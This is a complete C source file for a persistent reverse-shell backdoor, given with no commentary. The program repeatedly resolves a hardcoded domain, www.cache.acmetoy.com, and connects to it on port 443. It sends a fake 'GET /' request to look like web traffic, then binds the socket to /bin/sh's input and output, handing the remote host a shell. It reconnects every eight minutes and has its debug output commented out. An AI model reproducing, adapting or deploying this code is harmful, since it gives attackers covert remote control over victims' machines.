#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>

char domain[]="www.cache.acmetoy.com";
char shell[]="/bin/sh";
char message[]="GET /\n";

int main(int argc, char *argv[]) 
{
	struct sockaddr_in server;
	struct hostent* ht=NULL;
	int sock;
	pid_t pid;
	int status;

	while(1)
	{
		if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
		{
			//printf("Couldnt make socket! "); 
			exit(-1);
		}

		ht = gethostbyname(domain);
		if(!ht)
		{
			//printf("gethostbyname Error");
			goto Next;
		}	

		//printf("IP:%s\n",inet_ntoa(*(unsigned int*)ht->h_addr_list[0]));

		server.sin_family = AF_INET;
		server.sin_port = htons(443);
		server.sin_addr.s_addr = (*(unsigned int*)ht->h_addr_list[0]);

		if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) 
		{
			//printf("Could not connect! ");
			goto Next;
		}

		pid= fork();
		if(pid == 0)
		{//child process
                	send(sock, message, sizeof(message), 0);
                	dup2(sock, 0);
                	dup2(sock, 1);
                	dup2(sock, 2);

			execl(shell,"/bin/sh",(char *)0);
			exit(0);
		}
		else if(pid > 0)
		{	
			//printf("wait child\n");
			waitpid(pid,&status,0);
			//printf("child exit\n");
		}

Next:
		sleep(8*60);
		close(sock);
	}

	return 0;
}
